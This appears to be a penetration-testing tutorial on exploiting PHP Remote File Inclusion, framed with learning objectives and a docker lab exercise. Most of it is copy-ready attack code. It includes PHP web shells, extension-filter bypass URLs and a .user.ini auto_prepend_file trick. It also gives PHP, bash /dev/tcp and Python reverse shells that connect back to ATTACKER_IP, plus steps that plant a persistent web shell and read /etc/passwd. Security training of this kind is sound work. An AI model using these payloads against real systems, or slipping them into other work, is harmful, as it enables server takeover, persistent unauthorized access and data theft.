# RFI Remote Code Execution Guide

> Exploit Remote File Inclusion vulnerabilities to achieve direct code execution through remote payload hosting, PHP `auto_prepend_file` abuse, and converting file inclusion into reverse shell access. Covers the full RFI attack chain from `allow_url_include` detection to interactive shell.

## Introduction and Objectives

Remote File Inclusion (RFI) is one of the most critical web application vulnerabilities because it directly enables Remote Code Execution without requiring complex escalation chains. When a PHP application includes a file based on user-supplied input and the server allows remote URL inclusion (`allow_url_include = On`), an attacker can host a malicious PHP script on their own server and force the target to include and execute it.

While less common than LFI (most production PHP configurations disable `allow_url_include`), RFI provides a direct path to code execution that is more reliable and easier to exploit than LFI-to-RCE escalation. This guide covers the complete RFI exploitation process from detection through persistent shell access.

**Learning objectives**:

- Detect RFI potential by testing `allow_url_include` configuration
- Set up attacker-controlled payload hosting infrastructure
- Exploit RFI through HTTP, FTP, and SMB protocols
- Abuse PHP `auto_prepend_file` via `.user.ini` for code execution
- Convert RFI into a stable reverse shell
- Establish persistent access through post-exploitation web shells

**Prerequisites**: A web application with a file inclusion parameter that may accept remote URLs. An attacker-controlled server or local machine reachable by the target. Understanding of PHP configuration directives and web server behavior.

## 1. Detecting RFI Potential

Remote File Inclusion requires PHP's `allow_url_include` directive to be enabled. Detect this configuration before attempting RFI:

```bash
# Check if allow_url_include is enabled via phpinfo
curl "http://target/page=php://filter/convert.base64-encode/resource=/var/www/html/phpinfo.php" | base64 -d | grep allow_url_include

# Direct test: include a known URL and observe the response
# Start a listener on your server
python3 -m http.server 80

# Test if target fetches remote files
curl "http://target/page=http://ATTACKER_IP/test.txt"
# Check your HTTP server logs for a request from the target IP
```

If the target makes an HTTP request to your server, RFI is possible. If `allow_url_include` is Off, RFI will fail and you must fall back to LFI-to-RCE techniques covered in the `lfi-to-rce-exploitation-guide.md`.

## 2. Hosting Malicious Payloads

Set up an attacker-controlled server to host PHP payloads that will be included by the target:

**Basic HTTP server:**

```bash
# Create PHP payload (use .txt extension to avoid server-side execution on YOUR server)
cat > /tmp/shell.txt << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Host the payload
cd /tmp && python3 -m http.server 80
```

**PHP built-in server (useful for testing specific behaviors):**

```bash
# Host payload with PHP server
php -S 0.0.0.0:80 -t /tmp/
```

**Netcat one-liner for controlled responses:**

```bash
# Serve a single response with netcat
while true; do
  echo -e "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\n<?php system(\$_GET['cmd']); ?>" | nc -l -p 80 -q 1
done
```

**Reverse shell payload file:**

```bash
cat > /tmp/rs.txt << 'PAYLOAD'
<?php
$ip = 'ATTACKER_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
PAYLOAD
```

## 3. RFI Exploitation Techniques

### Direct RFI with Command Execution

```bash
# Include remote payload with command parameter
curl "http://target/page=http://ATTACKER_IP/shell.txt&cmd=id"

# Multiple commands
curl "http://target/page=http://ATTACKER_IP/shell.txt&cmd=whoami"
curl "http://target/page=http://ATTACKER_IP/shell.txt&cmd=cat%20/etc/passwd"
curl "http://target/page=http://ATTACKER_IP/shell.txt&cmd=ls%20-la%20/var/www/html"
```

### Bypassing Extension Filters

Some applications append a file extension to the included path or check the extension:

```bash
# Null byte to truncate appended extension (PHP < 5.3.4)
curl "http://target/page=http://ATTACKER_IP/shell.txt%00"
curl "http://target/page=http://ATTACKER_IP/shell.txt%00.php"

# Query string to make extension part of query parameter
curl "http://target/page=http://ATTACKER_IP/shell.txt?.php"
curl "http://target/page=http://ATTACKER_IP/shell.txt?cmd=id#.php"

# Fragment to append ignored data
curl "http://target/page=http://ATTACKER_IP/shell.txt%23.php"

# Use alternative extensions that the attacker server serves as text
curl "http://target/page=http://ATTACKER_IP/shell.jpg"
curl "http://target/page=http://ATTACKER_IP/shell.png"
```

### Protocol-Based RFI

```bash
# FTP-based RFI (useful when HTTP is filtered)
# Set up an FTP server with the payload
python3 -c "
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
authorizer = DummyAuthorizer()
authorizer.add_anonymous('/tmp/')
handler = FTPHandler
handler.authorizer = authorizer
server = FTPServer(('0.0.0.0', 21), handler)
server.serve_forever()
"
# Then exploit
curl "http://target/page=ftp://ATTACKER_IP/shell.txt&cmd=id"

# SMB-based RFI (Windows targets)
# Host payload on SMB share
# Then exploit with UNC path
curl "http://target/page=\\\\ATTACKER_IP\\share\\shell.txt"
```

## 4. PHP auto_prepend_file Abuse

PHP's `auto_prepend_file` directive prepends a file to every PHP script execution. If an attacker can create a `.user.ini` file in a directory where PHP scripts execute, they can force all PHP pages to include a malicious file:

```bash
# Step 1: Identify an upload directory that executes PHP
# Common locations: /uploads/, /images/, /files/
curl "http://target/uploads/test.php"  # Returns 404 or 403 = PHP processes this directory

# Step 2: Upload .user.ini via file upload vulnerability
cat > .user.ini << 'EOF'
auto_prepend_file=http://ATTACKER_IP/shell.txt
EOF

# Or if the target allows local file includes:
cat > .user.ini << 'EOF'
auto_prepend_file=shell.php
EOF

# Step 3: Upload the shell file to the same directory
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Step 4: Access any PHP file in that directory to trigger the prepend
curl "http://target/uploads/any-file.php?cmd=id"

# Note: .user.ini is re-read every 300 seconds (user_ini.cache_ttl)
# Wait for the cache to expire before the directive takes effect
```

This technique works even when `allow_url_include` is Off, because `auto_prepend_file` uses the `allow_url_fopen` directive instead, which is often enabled by default.

## 5. Converting RFI to Reverse Shell

Once RFI is confirmed, deliver a reverse shell payload:

```bash
# Step 1: Start netcat listener on attacker machine
nc -lvnp 4444

# Step 2: Create reverse shell payload
cat > /tmp/revshell.txt << 'PAYLOAD'
<?php
$ip = 'ATTACKER_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh',
  array(0 => $sock, 1 => $sock, 2 => $sock),
  $pipes
);
?>
PAYLOAD

# Step 3: Host the payload
cd /tmp && python3 -m http.server 80

# Step 4: Trigger the reverse shell via RFI
curl "http://target/page=http://ATTACKER_IP/revshell.txt"

# Alternative: Bash reverse shell payload
cat > /tmp/revshell.txt << 'PAYLOAD'
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
PAYLOAD

# Alternative: Python reverse shell payload
cat > /tmp/revshell.txt << 'PAYLOAD'
<?php
system('python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'');
?>
PAYLOAD
```

## 6. Post-Exploitation via RFI

After achieving shell access through RFI:

```bash
# Write a persistent web shell to the target
curl "http://target/page=http://ATTACKER_IP/write_shell.txt"
# write_shell.txt contains:
# <?php file_put_contents('shell.php', '<?php system($_GET["cmd"]); ?>'); ?>

# Verify the persistent shell
curl "http://target/shell.php?cmd=id"

# Enumerate the target
curl "http://target/shell.php?cmd=uname%20-a"
curl "http://target/shell.php?cmd=cat%20/etc/passwd"
curl "http://target/shell.php?cmd=ifconfig"

# Stabilize the reverse shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z, then: stty raw -echo; fg
```

## Hands-on Exercise: RFI Exploitation

Practice the complete RFI exploitation chain in a controlled lab environment:

**Setup**:

```bash
# Deploy a vulnerable RFI application on one terminal
docker run -d -p 8080:80 puzzles/rfi-lab

# On another terminal, set up your attacker payload server
mkdir -p /tmp/rfi-payloads && cd /tmp/rfi-payloads
cat > shell.txt << 'EOF'
<?php system($_GET['cmd']); ?>
EOF
python3 -m http.server 9090
```

**Exercise steps**:

1. Detect whether `allow_url_include` is enabled by testing remote URL inclusion
2. Observe the HTTP request from the target to your payload server in the server logs
3. Execute basic commands via RFI: `curl "http://localhost:8080/?page=http://YOUR_IP:9090/shell.txt&cmd=id"`
4. Attempt extension filter bypass techniques (null byte, query string, fragment)
5. Test FTP-based RFI by setting up a simple FTP server with the payload
6. Upload a `.user.ini` file to configure `auto_prepend_file` (if file upload exists)
7. Deliver a reverse shell payload and catch it with netcat
8. Write a persistent web shell to the target filesystem

**Validation criteria**: Achieve command execution through RFI using both HTTP and at least one alternative protocol. Successfully obtain a reverse shell. Write a persistent web shell and verify it works independently of the original RFI vector.

## References and Resources

- [OWASP - Remote File Inclusion](https://owasp.org/www-community/attacks/PHP_File_Inclusion)
- [HackTricks - RFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion#rfi)
- [PortSwigger - File Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [PHP Runtime Configuration - allow_url_include](https://www.php.net/manual/en/filesystem.configuration.php)
- [pentestmonkey - Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
